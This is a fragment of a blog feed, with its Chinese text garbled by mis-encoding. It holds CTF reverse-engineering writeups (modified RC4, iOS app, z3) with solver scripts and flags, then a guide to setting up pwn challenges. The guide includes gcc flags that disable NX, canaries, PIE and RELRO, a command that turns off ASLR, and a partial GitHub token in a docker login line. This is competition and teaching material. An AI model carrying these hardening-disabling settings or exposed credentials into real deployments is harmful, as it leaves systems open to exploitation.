((v3 &amp; <span class="hljs-number">0x0F</span>) &lt;&lt; <span class="hljs-number">4</span>) | ((v2 &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">0x0F</span>)<br>        byte3 = ((v2 &amp; <span class="hljs-number">0x03</span>) &lt;&lt; <span class="hljs-number">6</span>) | v4<br>        <span class="hljs-comment"># æ ¹æ®ç­‰å·ä½ç½®åˆ¤æ–­æœ‰æ•ˆå­—èŠ‚</span><br>        <span class="hljs-keyword">if</span> c2 == <span class="hljs-string">&#x27;=&#x27;</span>: <span class="hljs-comment"># ä»…1å­—èŠ‚æœ‰æ•ˆ</span><br>            bytes_list.append(byte1)<br>        <span class="hljs-keyword">elif</span> c4 == <span class="hljs-string">&#x27;=&#x27;</span>: <span class="hljs-comment"># 2å­—èŠ‚æœ‰æ•ˆ</span><br>            bytes_list.append(byte1)<br>            bytes_list.append(byte2)<br>        <span class="hljs-keyword">else</span>: <span class="hljs-comment"># 3å­—èŠ‚æœ‰æ•ˆ</span><br>            bytes_list.append(byte1)<br>            bytes_list.append(byte2)<br>            bytes_list.append(byte3)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(bytes_list)<br><span class="hljs-comment"># ç¤ºä¾‹éªŒè¯</span><br>encoded_str = <span class="hljs-string">&quot;aFj5YITya42wdRzuZIHwM5Wk&quot;</span><br>decoded_bytes = decode_custom_base64(encoded_str)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Decoded: <span class="hljs-subst">&#123;decoded_bytes&#125;</span>&quot;</span>) <span class="hljs-comment"># è¾“å‡º a3</span><br><span class="hljs-comment"># j1ya22kn0w4ndr01nd</span><br></code></pre></td></tr></table></figure><p>rc4é­”æ”¹éƒ¨åˆ†ä¸ºæŠŠåŸæ¥çš„å¼‚æˆ–æ“ä½œæ”¹ä¸ºåŠ æ“ä½œ</p><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1747183939050-d40c0ecd-4273-4789-98c7-7f3e203f31e1.png" class="" title="img"><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1747184168108-49eb77d9-a396-4005-b2b7-8e4ba05656cc.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">data, key</span>):<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    out = []<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        char -= S[(S[i] + S[j])%<span class="hljs-number">256</span>]<br>        out.append(char% <span class="hljs-number">256</span>)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(out)<br><br><br>a=[<span class="hljs-number">14</span>, <span class="hljs-number">50</span>, -<span class="hljs-number">82</span>, <span class="hljs-number">75</span>, -<span class="hljs-number">125</span>, <span class="hljs-number">55</span>, -<span class="hljs-number">112</span>, <span class="hljs-number">85</span>, <span class="hljs-number">99</span>, -<span class="hljs-number">56</span>, <span class="hljs-number">97</span>, -<span class="hljs-number">82</span>, <span class="hljs-number">69</span>, <span class="hljs-number">61</span>, -<span class="hljs-number">2</span>, -<span class="hljs-number">113</span>, -<span class="hljs-number">99</span>, <span class="hljs-number">48</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    <span class="hljs-keyword">if</span> a[i]&lt;<span class="hljs-number">0</span>:<br>        a[i]+=<span class="hljs-number">256</span><br>data = <span class="hljs-built_in">bytes</span>(a)<br>key = <span class="hljs-string">b&#x27;j1ya22kn0w4ndr01nd&#x27;</span><br>decrypted = rc4(data, key)<br><span class="hljs-built_in">print</span>(decrypted)<br><span class="hljs-comment">#b&#x27;andro1nd14d1ffcult&#x27;</span><br></code></pre></td></tr></table></figure><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1747183960160-8659127c-cf12-4cac-940d-a22c8e4f4b19.png" class="" title="img"><p>flag{j1ya22kn0w4ndr01nd_andro1nd14d1ffcult}</p><h2 id="IosRE"><a href="#IosRE" class="headerlink" title="IosRE"></a>IosRE</h2><p>é¢„æœŸè§£å‡ºäººæ•°ï¼š3</p><p>å®é™…è§£å‡ºäººæ•°ï¼š1</p><p>è¢«å­¦å¼Ÿæ‰¾åˆ°ä¹‹å‰å†™çš„æ–‡ç« ç§’äº†</p><p><a href="https://j1ya-22.github.io/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/">https://j1ya-22.github.io/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/</a></p><p>ipaæ–‡ä»¶ï¼Œé¦–å…ˆè§£å‹</p><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1746498783174-d9447c94-86f8-4636-8768-a76e33f18725.png" class="" title="img"><p>UnDebuggableå³æˆ‘ä»¬è¦é€†å‘çš„æ–‡ä»¶</p><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1746498789525-d91055d7-b3de-40c5-8579-933d411a1e77.png" class="" title="img"><p>åœ¨buttonClickå‡½æ•°ä¸­æ‰¾åˆ°æ¯”å¯¹å¤„</p><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1746498793851-932f8962-4103-4b0a-bc03-5b55edcee72b.png" class="" title="img"><p>å¯ä»¥çœ‹åˆ°ï¼Œæ¯”å¯¹é€»è¾‘æ˜¯æŠŠæˆ‘ä»¬çš„è¾“å…¥å†…å®¹(theTextField)å’ŒtheLabel.textçš„å†…å®¹è¿›è¡Œç›¸åŒæ£€æµ‹</p><p>æ‰€ä»¥ä¸‹ä¸€æ­¥å°±æ˜¯å¯¹theLabelè¿›è¡Œäº¤å‰å¼•ç”¨ï¼Œçœ‹çœ‹å“ªäº›éƒ¨åˆ†å¯¹labelè¿›è¡Œäº†æ”¹åŠ¨</p><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1746498807488-4c29b3d9-ea36-4912-b7f8-58f40c877204.png" class="" title="img"><p>å¯ä»¥çœ‹åˆ°viewDidLoadé‡Œé¢åŒæ ·å¼•ç”¨äº†theLabelï¼Œæˆ‘ä»¬è¿›å»çœ‹çœ‹</p><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1746498820713-f28d3367-f00d-475e-b3f0-99a5da2d28e6.png" class="" title="img"><p>è¿™é‡Œå¯¹unk_10000F541å­—èŠ‚é€ä½å’ŒIosè¿›è¡Œäº†å¼‚æˆ–æ“ä½œï¼Œæ‰€ä»¥è§£å¯†å°±æ˜¯åè¿‡æ¥æ“ä½œ</p><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1746498825880-579ebe5b-3156-403d-bbf2-59bc9add99ec.png" class="" title="img"><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;Reverse_f0r_I0s_1s_InteresTing&#125;</span><br></code></pre></td></tr></table></figure><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1746498856509-3a4e351a-db79-4c30-ad79-ae30ceb1c55e.png" class="" title="img"><h2 id="babyz3"><a href="#babyz3" class="headerlink" title="babyz3"></a>babyz3</h2><p>æ˜ç¡®çš„z3ï¼Œä½†æ˜¯ä¸‹é¢çš„æ–¹ç¨‹å¯¼è‡´ä¾‹å¦‚s[0]å’Œs[2]å¯ä»¥äº’æ¢ï¼Œè¿™æ ·è€ƒè™‘çš„è¯è¿™é“é¢˜è‡³å°‘æœ‰8ä¸ªflag</p><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1711884342433-1f41b761-935d-4556-ab80-c1a713e7eff2.png" class="" title="img"><p>ä¸€ç›´ä»¥ä¸ºè§£æ˜¯å”¯ä¸€çš„ï¼Œå®³å¾—å¸ˆå‚…ä»¬å¡äº†å¥½ä¹…ï¼Œè¿™é‡Œç»™æ‰€æœ‰å¡ä½çš„å¸ˆå‚…ç£•ä¸€ä¸ª</p><img src="/2025/05/14/ZJPCTF-X-ZJGSUCTF-2025-Reverse-Pwn-wp/1746977451834-00d4cfb1-9dfb-4043-b6b6-f1dcd0178f96.png" class="" title="img"><p>ä¸‹é¢åªæ˜¯å…¶ä¸­ä¸€ä¸ªæ–¹ç¨‹å¾—åˆ°çš„ä¸€ä¸ªflagï¼Œlinuxä¸‹è¿è¡Œåè¾“å…¥å¾—åˆ°check okçš„éƒ½æ˜¯å¯¹çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> (<span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>, <span class="hljs-number">128</span>)):<br>    x = Solver()<br>    ans = []<br>    s = [BitVec((<span class="hljs-string">&#x27;%d&#x27;</span> % i), <span class="hljs-number">32</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>)]<br>    x.add(s[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0xff</span> == i)<br>    x.add((s[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0xffff</span>) * (s[<span class="hljs-number">0</span>] &gt;&gt; <span class="hljs-number">16</span>) == <span class="hljs-number">342772773</span><br>          , (s[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0xffff</span>) + (s[<span class="hljs-number">0</span>] &gt;&gt; <span class="hljs-number">16</span>) == <span class="hljs-number">39526</span><br>          , s[<span class="hljs-number">1</span>] - s[<span class="hljs-number">2</span>] == <span class="hljs-number">1005712381</span><br>          , (s[<span class="hljs-number">1</span>] &amp; <span class="hljs-number">0xffff</span>) + (s[<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">16</span>) == <span class="hljs-number">56269</span><br>          , (s[<span class="hljs-number">2</span>] &amp; <span class="hljs-number">0xffff</span>) - (s[<span class="hljs-number">2</span>] &gt;&gt; <span class="hljs-number">16</span>) == <span class="hljs-number">15092</span><br>          , ((s[<span class="hljs-number">1</span>]) &amp; <span class="hljs-number">0xff</span>) * ((s[<span class="hljs-number">2</span>]) &amp; <span class="hljs-number">0xff</span>) == <span class="hljs-number">10710</span><br>          , ((s[<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xff</span>) * ((s[<span class="hljs-number">2</span>] &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xff</span>) == <span class="hljs-number">12051</span><br>          , ((s[<span class="hljs-number">1</span>]) &gt;&gt; <span class="hljs-number">24</span>) + ((s[<span class="hljs-number">2</span>]) &gt;&gt; <span class="hljs-number">24</span>) == <span class="hljs-number">172</span><br>          , (s[<span class="hljs-number">3</span>] &amp; <span class="hljs-number">0xffff</span>) * (s[<span class="hljs-number">3</span>] &gt;&gt; <span class="hljs-number">16</span>) == <span class="hljs-number">171593250</span><br>          , (s[<span class="hljs-number">3</span>] &amp; <span class="hljs-number">0xffff</span>) + (s[<span class="hljs-number">3</span>] &gt;&gt; <span class="hljs-number">16</span>) == <span class="hljs-number">26219</span><br>          , (s[<span class="hljs-number">4</span>] &amp; <span class="hljs-number">0xffff</span>) * (s[<span class="hljs-number">4</span>] &gt;&gt; <span class="hljs-number">16</span>) == <span class="hljs-number">376306868</span><br>          , (s[<span class="hljs-number">4</span>] &amp; <span class="hljs-number">0xffff</span>) + (s[<span class="hljs-number">4</span>] &gt;&gt; <span class="hljs-number">16</span>) == <span class="hljs-number">40341</span>)<br>    <span class="hljs-keyword">if</span> x.check() == sat:<br>        model = x.model()<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> s:<br>            <span class="hljs-built_in">print</span>(libnum.n2s(model[j].as_long())[::-<span class="hljs-number">1</span>].decode(), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-built_in">print</span>()<br><span class="hljs-comment">#5h12fggtisu89521ad49</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rc4é­”æ”¹</tag>
      
      <tag>æ ˆè¿ç§»</tag>
      
      <tag>æ ¼å¼åŒ–å­—ç¬¦ä¸²</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pwnå‡ºé¢˜ç®€å•æ€»ç»“</title>
    <link href="/2025/05/11/Pwn%E5%87%BA%E9%A2%98%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/"/>
    <url>/2025/05/11/Pwn%E5%87%BA%E9%A2%98%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/ve1kcon/p/18128333">https://www.cnblogs.com/ve1kcon/p/18128333</a></p><p><a href="https://xz.aliyun.com/t/14507?time__1311=GqAhDIqIxUxmx0yx4+grxgQAPi=kf3x">https://xz.aliyun.com/t/14507?time__1311=GqAhDIqIxUxmx0yx4%2BgrxgQAPi%3Dkf3x</a></p><p><a href="https://cn-sec.com/archives/3119494.html">https://cn-sec.com/archives/3119494.html</a></p><h1 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h1><p>ç”±äºdockerçš„åŸå› ï¼Œè¦å¼€å¯clashçš„tunå’ŒæœåŠ¡æ¨¡å¼</p><img src="/2025/05/11/Pwn%E5%87%BA%E9%A2%98%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1721984324990-1e80697c-6996-4673-a05f-a96b7009ee54.png" class="" title="img"><p>é‡å¯dockerç¯å¢ƒä¹‹åå¹³å°ä¹Ÿè¦é‡å¯ï¼Œå®¹å™¨é¡ºåºä¸ä¸€å®šæŒ‰ä¿®æ”¹çš„å…ˆåé¡ºåºæ’åˆ—</p><img src="/2025/05/11/Pwn%E5%87%BA%E9%A2%98%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1722158422023-6d246969-f23e-4f92-bff0-308837465892.png" class="" title="img"><h2 id="ç¼–è¯‘ç¯å¢ƒ"><a href="#ç¼–è¯‘ç¯å¢ƒ" class="headerlink" title="ç¼–è¯‘ç¯å¢ƒ"></a>ç¼–è¯‘ç¯å¢ƒ</h2><p>dockeræ˜¯ubuntuçš„ï¼Œæ‰€ä»¥å»ºè®®åœ¨Ubuntuä¸Šç¼–è¯‘äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¦‚æœæ²¡æœ‰ç‰¹å®šç‰ˆæœ¬å°±ç”¨dockeræ„å»º</p><p>ç¼–è¯‘ç‰¹å®šglibcç‰ˆæœ¬çš„é™„ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ä½¿ç”¨Ubuntu 16.04ä½œä¸ºåŸºç¡€é•œåƒ</span><br>FROM ubuntu:<span class="hljs-number">16.04</span><br><br><span class="hljs-comment"># æ¢æº</span><br>RUN sed -i <span class="hljs-string">&#x27;s@//.*archive.ubuntu.com@//mirrors.ustc.edu.cn@g&#x27;</span> /etc/apt/sources.<span class="hljs-built_in">list</span> &amp;&amp; \<br>    sed -i <span class="hljs-string">&#x27;s@//.*security.ubuntu.com@//mirrors.ustc.edu.cn@g&#x27;</span> /etc/apt/sources.<span class="hljs-built_in">list</span><br><span class="hljs-comment"># æ›´æ–°è½¯ä»¶åŒ…å¹¶å®‰è£…å¿…è¦çš„ä¾èµ–</span><br>RUN apt-get update &amp;&amp; apt-get install -y \<br>    build-essential \<br>    gcc \<br>    libc6-dev \<br>    &amp;&amp; apt-get clean \<br>    &amp;&amp; rm -rf /var/lib/apt/lists/*<br><br><span class="hljs-comment"># è®¾ç½®å·¥ä½œç›®å½•</span><br>WORKDIR /app<br><br><span class="hljs-comment"># å°†ä½ çš„Cä»£ç å¤åˆ¶åˆ°å®¹å™¨ä¸­</span><br>COPY test.c /app/<br><br><span class="hljs-comment"># ç¼–è¯‘ä½ çš„Cä»£ç å¹¶å°†ç¼–è¯‘åçš„äºŒè¿›åˆ¶æ–‡ä»¶ä¿å­˜åˆ°/appç›®å½•ä¸­</span><br>RUN gcc -z norelro -fno-stack-protector -no-pie -z execstack -o test test.c<br><br><span class="hljs-comment"># ä¿æŒå®¹å™¨è¿è¡Œï¼Œä»¥ä¾¿ä¸»æœºè®¿é—®å®¹å™¨å†…çš„ç¼–è¯‘ç»“æœ</span><br>CMD [<span class="hljs-string">&quot;sleep&quot;</span>, <span class="hljs-string">&quot;infinity&quot;</span>]<br></code></pre></td></tr></table></figure><p>gccç¼–è¯‘</p><ul><li>NX ï¼š-z execstack &#x2F; -z noexecstack (å…³é—­ &#x2F; å¼€å¯) ä¸è®©æ‰§è¡Œæ ˆä¸Šçš„æ•°æ®ï¼Œäºæ˜¯JMP ESPå°±ä¸èƒ½ç”¨äº†</li><li>Canary ï¼š-fno-stack-protector &#x2F;-fstack-protector &#x2F; -fstack-protector-all (å…³é—­ &#x2F; å¼€å¯ &#x2F; å…¨å¼€å¯) æ ˆé‡Œæ’å…¥cookieä¿¡æ¯</li><li>PIE ï¼š-no-pie &#x2F; -pie (å…³é—­ &#x2F; å¼€å¯) åœ°å€éšæœºåŒ–ï¼Œå¦å¤–æ‰“å¼€åä¼šæœ‰get_pc_thunk</li><li>RELRO ï¼š-z norelro &#x2F; -z lazy &#x2F; -z now (å…³é—­ &#x2F; éƒ¨åˆ†å¼€å¯ &#x2F; å®Œå…¨å¼€å¯) å¯¹GOTè¡¨å…·æœ‰å†™æƒé™</li></ul><h2 id="å¾—åˆ°ç‰¹å®šäºŒè¿›åˆ¶æ–‡ä»¶"><a href="#å¾—åˆ°ç‰¹å®šäºŒè¿›åˆ¶æ–‡ä»¶" class="headerlink" title="å¾—åˆ°ç‰¹å®šäºŒè¿›åˆ¶æ–‡ä»¶"></a>å¾—åˆ°ç‰¹å®šäºŒè¿›åˆ¶æ–‡ä»¶</h2><p>sudo docker run -it glibc2.23 &#x2F;bin&#x2F;bash</p><img src="/2025/05/11/Pwn%E5%87%BA%E9%A2%98%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1746770814834-3ecc509c-cca4-4f2e-bace-5b90cf16795f.png" class="" title="img"><p>sudo docker cp 947e24ecf60a:&#x2F;app&#x2F;format_master ~&#x2F;Desktop&#x2F;</p><p>ä¸€èˆ¬é€‰æ‹©ç›´æ¥éƒ¨ç½²åˆ°æœåŠ¡å™¨ä¸Šï¼Œå› ä¸ºæœ¬åœ°éƒ¨ç½²å®Œä¼šå‡ºç°nc 127.0.0.1 ç«¯å£ æ— å›æ˜¾çš„æƒ…å†µ</p><h1 id="å¸¸è§dockerå‘½ä»¤"><a href="#å¸¸è§dockerå‘½ä»¤" class="headerlink" title="å¸¸è§dockerå‘½ä»¤"></a>å¸¸è§dockerå‘½ä»¤</h1><p>dockerç›¸å…³å‘½ä»¤éƒ½è¦sudoæƒé™</p><p>æŸ¥çœ‹å®¹å™¨ï¼šsudo docker ps</p><p>åœæ­¢å®¹å™¨ï¼šsudo docker stop 8b</p><p>åˆ é™¤é•œåƒï¼šsudo docker rmi e1</p><p>è¿›å…¥å®¹å™¨ï¼šsudo docker exec -it your_stack &#x2F;bin&#x2F;bash</p><p>é€€å‡ºå®¹å™¨ï¼šctrl+d</p><p>æ ¹æ®é•œåƒåˆ›å»ºå®¹å™¨ï¼šdocker build -t format_master .</p><h1 id="GZCTFåŠ¨æ€flagéƒ¨ç½²"><a href="#GZCTFåŠ¨æ€flagéƒ¨ç½²" class="headerlink" title="GZCTFåŠ¨æ€flagéƒ¨ç½²"></a>GZCTFåŠ¨æ€flagéƒ¨ç½²</h1><p><a href="https://cn-sec.com/archives/3119494.html">https://cn-sec.com/archives/3119494.html</a></p><p><a href="https://skynionkrz.github.io/2024/08/22/%E5%87%BA%E9%A2%98%E6%B5%81%E7%A8%8B/">https://skynionkrz.github.io/2024/08/22/%E5%87%BA%E9%A2%98%E6%B5%81%E7%A8%8B/</a></p><p>echo ghp_ZcmbShK0PitZqOfHDFâ€¦â€¦ | docker login ghcr.io â€“username j1ya-22 â€“password-stdin</p><p>docker tag format_master ghcr.io&#x2F;j1ya-22&#x2F;format_master:latest</p><p>docker push ghcr.io&#x2F;j1ya-22&#x2F;format_master:latest</p><img src="/2025/05/11/Pwn%E5%87%BA%E9%A2%98%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1746935861062-7f36ed3b-6e13-4bc5-a982-cfb54ed2cd65.png" class="" title="img"><p>æ¯”èµ›æ²¡å¼€å§‹çš„æ—¶å€™å¾—åˆ°çš„flag<img src="/2025/05/11/Pwn%E5%87%BA%E9%A2%98%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1746759697511-41cf46a2-e11c-43b0-95ab-21e57c8eff06.png" class="" title="img"></p><p>å®é™…æ•ˆæœ</p><img src="/2025/05/11/Pwn%E5%87%BA%E9%A2%98%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1746756970976-9779477c-daa9-4768-a50f-4989f4adffb6.png" class="" title="img"><p>å¹³å°å¼€å¯æµ‹è¯•å®¹å™¨ï¼ŒæœåŠ¡å™¨å°±èƒ½ç”Ÿæˆæœ‰åç¼€çš„å¯¹åº”å®¹å™¨</p><img src="/2025/05/11/Pwn%E5%87%BA%E9%A2%98%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1746760376512-dc884c03-b98a-4f84-a533-e87d4f6c14ec.png" class="" title="img"><img src="/2025/05/11/Pwn%E5%87%BA%E9%A2%98%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1746760251104-2fcc4a6b-8622-4064-8d39-bb95873897d2.png" class="" title="img"><h1 id="é‡åˆ°çš„é—®é¢˜"><a href="#é‡åˆ°çš„é—®é¢˜" class="headerlink" title="é‡åˆ°çš„é—®é¢˜"></a>é‡åˆ°çš„é—®é¢˜</h1><h2 id="glibc-xx-not-found"><a href="#glibc-xx-not-found" class="headerlink" title="glibc_xx not found"></a>glibc_xx not found</h2><p>ç”¨kali22çš„gccç¼–è¯‘å¾—åˆ°çš„äºŒè¿›åˆ¶æ–‡ä»¶éœ€è¦glibc2.34ï¼Œä½†æ˜¯dockerfileé»˜è®¤æ˜¯ubuntu16<img src="/2025/05/11/Pwn%E5%87%BA%E9%A2%98%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1746759789254-c490c092-1839-49e6-9d38-6b4affbef0f5.png" class="" title="img"></p><p>åœ¨æœ¬åœ°æ­ä¸€ä¸ªç‰¹å®šç‰ˆæœ¬çš„dockeræ¥ç¼–è¯‘äºŒè¿›åˆ¶æ–‡ä»¶</p><h2 id="æ‰§è¡Œno-such-file"><a href="#æ‰§è¡Œno-such-file" class="headerlink" title=".&#x2F;æ‰§è¡Œno such file"></a>.&#x2F;æ‰§è¡Œno such file</h2><p>é¢˜ç›®æœ¬èº«éœ€è¦libcæ–‡ä»¶åŠ è½½ï¼Œä¸ç„¶æ— æ³•åœ¨è¿œç¨‹è¿è¡Œ</p><img src="/2025/05/11/Pwn%E5%87%BA%E9%A2%98%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1746802852208-5265bf29-af41-4df5-91a2-13adfb6e2f6f.png" class="" title="img"><p>æŠŠlibc.so.6æ–‡ä»¶ï¼ˆå®é™…lbc-2.23.soï¼‰æ”¾åˆ°å’ŒäºŒè¿›åˆ¶æ–‡ä»¶åŒä¸€ç›®å½•ï¼Œå…¶ä»–å¦‚ld-2.23.soéƒ½ä¸éœ€è¦</p><h2 id="è¿œç¨‹å‡½æ•°çœŸå®åœ°å€éšæœº"><a href="#è¿œç¨‹å‡½æ•°çœŸå®åœ°å€éšæœº" class="headerlink" title="è¿œç¨‹å‡½æ•°çœŸå®åœ°å€éšæœº"></a>è¿œç¨‹å‡½æ•°çœŸå®åœ°å€éšæœº</h2><p>putsç­‰å‡½æ•°çœŸå®åœ°å€ä¸ä¸€å®šæ˜¯0x7få¼€å¤´ï¼Œä½†å¦‚æœæ˜¯0x7cç­‰å¼€å¤´ä¹Ÿèƒ½æ‰“é€šï¼Œä¸»è¦æ˜¯åœ°å€éšæœºåŒ–çš„ç¼˜æ•…</p><p>éœ€è¦å…³é—­ç³»ç»Ÿåœ°å€éšæœºåŒ–bash -c â€œecho 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_spaceâ€</p><img src="/2025/05/11/Pwn%E5%87%BA%E9%A2%98%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1746861802891-20a3ec08-3feb-4bf5-8ef7-1411dac62281.png" class="" title="img">]]></content>
    
    
    <categories>
      
      <category>ç¯å¢ƒé…ç½®</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2025èƒ½æºå®‰å…¨åˆèµ›éƒ¨åˆ†wp</title>
    <link href="/2025/04/24/2025%E8%83%BD%E6%BA%90%E5%AE%89%E5%85%A8%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/"/>
    <url>/2025/04/24/2025%E8%83%BD%E6%BA%90%E5%AE%89%E5%85%A8%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<img src="/2025/04/24/2025%E8%83%BD%E6%BA%90%E5%AE%89%E5%85%A8%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1744882807533-2dfe600a-dbb8-4ffa-9164-2447f340b340.png" class="" title="img"><p>ä¸€æ•´å¤©æ‰“æ¯”èµ›çœŸçš„å¥½ç´¯ï¼Œæ™šä¸Šåç‚¹åªæƒ³ä¸ŠåºŠç¡è§‰ğŸ˜¥</p><h1 id="èƒ½æºè¡Œä¸š"><a href="#èƒ½æºè¡Œä¸š" class="headerlink" title="èƒ½æºè¡Œä¸š"></a>èƒ½æºè¡Œä¸š</h1><h2 id="lava"><a href="#lava" class="headerlink" title="lava"></a>lava</h2><p>äºŒè¡€</p><p>dieå‘ç°æœ‰upxå£³</p><img src="/2025/04/24/2025%E8%83%BD%E6%BA%90%E5%AE%89%E5%85%A8%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1744853315645-719ccb3a-8db6-4037-a20c-f4e489a502a2.png" class="" title="img"><p>ä¿®è¡¥upxç‰¹å¾ç </p><img src="/2025/04/24/2025%E8%83%BD%E6%BA%90%E5%AE%89%E5%85%A8%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1744855385753-6554fb5f-766a-431c-8e77-290089ca1cd1.png" class="" title="img"><img 